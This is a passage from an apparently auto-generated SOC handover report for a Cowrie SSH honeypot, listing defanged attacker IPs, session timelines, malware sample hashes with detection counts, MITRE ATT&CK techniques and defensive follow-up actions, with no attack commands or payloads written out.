| `2026-05-28 07:36:24` | `cowrie.session.params` |
| `2026-05-28 07:36:24` | `cowrie.command.input` |
| `2026-05-28 07:36:24` | `cowrie.session.file_download` |
| `2026-05-28 07:36:24` | `cowrie.log.closed` |
| `2026-05-28 07:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.201.243[.]44` to AbuseIPDB if not already reported
- [ ] Block `84.201.243[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c664f190b9b

| Field | Detail |
|---|---|
| **Source IP** | `84.201.243[.]44` |
| **First Seen** | 2026-05-28 07:36 |
| **Last Seen** | 2026-05-28 07:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-28 07:36:27` | `cowrie.session.connect` |
| `2026-05-28 07:36:27` | `cowrie.client.version` |
| `2026-05-28 07:36:29` | `cowrie.client.kex` |
| `2026-05-28 07:36:31` | `cowrie.login.success` |
| `2026-05-28 07:36:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `84.201.243[.]44` to AbuseIPDB if not already reported
- [ ] Block `84.201.243[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `192.169.234[.]117` | **35** | 2026-05-28 04:15 | 2026-05-28 07:31 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `104.155.42[.]140` | **33** | 2026-05-28 05:44 | 2026-05-28 05:44 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.156.243[.]115` | **33** | 2026-05-28 07:02 | 2026-05-28 07:03 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `101.36.124[.]127` | **11** | 2026-05-28 05:38 | 2026-05-28 05:59 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `102.88.137[.]213` | **11** | 2026-05-28 07:44 | 2026-05-28 08:05 | 0m | 11 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.255.18[.]62` | **3** | 2026-05-28 05:11 | 2026-05-28 05:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `172.202.117[.]179` | **2** | 2026-05-28 07:58 | 2026-05-28 07:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `181.209.107[.]38` | **2** | 2026-05-28 04:04 | 2026-05-28 04:06 | 4m | 0 | `T1592` | 🟢 LOW |
| `24.142.52[.]80` | **2** | 2026-05-28 05:54 | 2026-05-28 07:08 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.79.181[.]151` | **2** | 2026-05-28 04:24 | 2026-05-28 04:24 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]110` | **2** | 2026-05-28 07:34 | 2026-05-28 07:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `84.201.243[.]44` | **2** | 2026-05-28 07:30 | 2026-05-28 07:36 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `101.96.193[.]131` | 1 | 2026-05-28 07:21 | 2026-05-28 07:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.19.252[.]39` | 1 | 2026-05-28 07:48 | 2026-05-28 07:48 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.104.154[.]26` | 1 | 2026-05-28 07:27 | 2026-05-28 07:27 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.106[.]205` | 1 | 2026-05-28 05:50 | 2026-05-28 05:50 | 4s | 0 | `T1592` | 🟢 LOW |
| `120.48.75[.]127` | 1 | 2026-05-28 05:48 | 2026-05-28 05:50 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]100` | 1 | 2026-05-28 07:12 | 2026-05-28 07:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.121[.]146` | 1 | 2026-05-28 06:01 | 2026-05-28 06:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `167.99.149[.]55` | 1 | 2026-05-28 07:23 | 2026-05-28 07:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.240[.]16` | 1 | 2026-05-28 07:49 | 2026-05-28 07:51 | 120s | 0 | `T1592` | 🟢 LOW |
| `41.1.87[.]122` | 1 | 2026-05-28 05:46 | 2026-05-28 05:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]77` | 1 | 2026-05-28 07:32 | 2026-05-28 07:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `71.90.30[.]53` | 1 | 2026-05-28 08:03 | 2026-05-28 08:04 | 38s | 0 | `T1592` | 🟢 LOW |
| `72.179.72[.]28` | 1 | 2026-05-28 05:08 | 2026-05-28 05:08 | 31s | 0 | `T1592` | 🟢 LOW |
| `79.10.144[.]18` | 1 | 2026-05-28 07:54 | 2026-05-28 07:54 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `34.79.181[.]151` | BE | Google LLC | **100** ⚠️ | 0 |
| `120.48.75[.]127` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 14 |
| `167.99.149[.]55` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `181.209.107[.]38` | AR | ZALAZAR DERMIDIO RAUL | **100** ⚠️ | 3 |
| `103.19.252[.]39` | PK | Trans World Enterprise Services (Private) Limited | **100** ⚠️ | 0 |
| `192.169.234[.]117` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |
| `66.132.195[.]77` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `101.96.193[.]131` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 7 |
| `14.103.112[.]100` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `104.155.42[.]140` | BE | Google LLC | **100** ⚠️ | 1 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 53 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 35 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 14 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (18 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 14 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 184 cases |
| Tool 34  | Credential Extractor        | ✅ 51 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 7 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 34 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 18 filtered (9.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 14 priority case(s) shown individually · 26 recon entry/entries in table (12 group(s) consolidating 138 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-28T08:06:15Z_
